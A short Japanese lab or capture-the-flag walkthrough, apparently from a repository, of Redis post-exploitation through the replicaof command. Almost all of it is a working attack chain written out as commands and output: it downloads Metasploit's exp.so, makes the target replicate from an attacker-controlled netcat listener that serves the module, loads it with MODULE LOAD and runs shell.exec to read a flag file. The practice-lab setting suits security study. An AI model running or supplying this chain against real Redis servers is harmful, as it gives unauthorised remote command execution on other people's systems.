# redis replicaof

## 環境構築

```
$ docker build -t redis .
$ docker run -d -p 0.0.0.0:6379:6379 redis:latest
```

## Exploit
IPアドレスを確認

```
$ ip a
root@gateway:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc noqueue state UP group default qlen 1000
    link/ether 0a:0a:5b:7f:7b:bb brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.185.89/19 brd 192.168.191.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::80a:5bff:fe7f:7bbb/64 scope link
       valid_lft forever preferred_lft forever
```

このケースでは192.168.185.89で通信できる


```
$ wget -O exp.so "https://github.com/rapid7/metasploit-framework/blob/a2675c13e88dc1df9e6cfed9021b2a5d4f82d231/data/exploits/redis/exp/exp.so?raw=true"
$ redis-cli -h redis-replica replicaof 192.168.185.89 20000
$ ( echo "+PONG"; echo "+OK"; echo "+OK"; echo "+OK"; echo "\$46800"; cat exp.so ; ) | nc -lk -p 20000
$ redis-cli -h redis-replica
redis:6379> MODULE LOAD ./dump.rdb
OK
redis:6379> shell.exec "cat /flag.txt"
"flag{r3d1s_p05t_expl0it4tion!!1!!}\n"
```

## 備考
CONFIGコマンドは無効にしている
